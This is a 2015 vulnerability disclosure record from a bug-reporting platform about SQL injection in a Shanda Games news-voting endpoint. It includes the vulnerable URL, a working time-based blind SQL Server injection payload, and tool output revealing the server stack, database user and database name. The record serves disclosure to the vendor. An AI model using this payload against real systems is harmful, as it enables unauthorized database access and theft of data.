wybug_title: 盛大游戏某分站存在SQL注射
wybug_detail:
漏洞详情 披露状态：   									2015-06-28：	细节已通知厂商并且等待厂商处理中									2015-06-29：	厂商已经确认，细节仅向厂商公开									2015-07-09：	细节向核心白帽子及相关领域专家公开									2015-07-19：	细节向普通白帽子公开									2015-07-29：	细节向实习白帽子公开									2015-08-13：	细节向公众公开  简要描述： 233 详细说明：  
blood.sdo.com/NewsApp/GetVoteInfo.ashx?bm=UTF-8&jsoncallback=jQuery110208044651036616415_1435472623715&nacId=X&naId=1&t=0.0029577359091490507&_=1435472623717 (GET)
   漏洞证明：  
---Parameter: nacId (GET)    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase OR time-based blind (heavy query)    Payload: bm=UTF-8&jsoncallback=jQuery110208044651036616415_1435472623715&nacId=X' OR 2450=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) AND 'jiGR'='jiGR&naId=1&t=0.0029577359091490507&_=1435472623717---web server operating system: Windows 2008 R2 or 7web application technology: ASP.NET 4.0.30319, Microsoft IIS 7.5, ASP.NETback-end DBMS: Microsoft SQL Server 2008current user:    'xzu_new'current database:    'xzu_new'
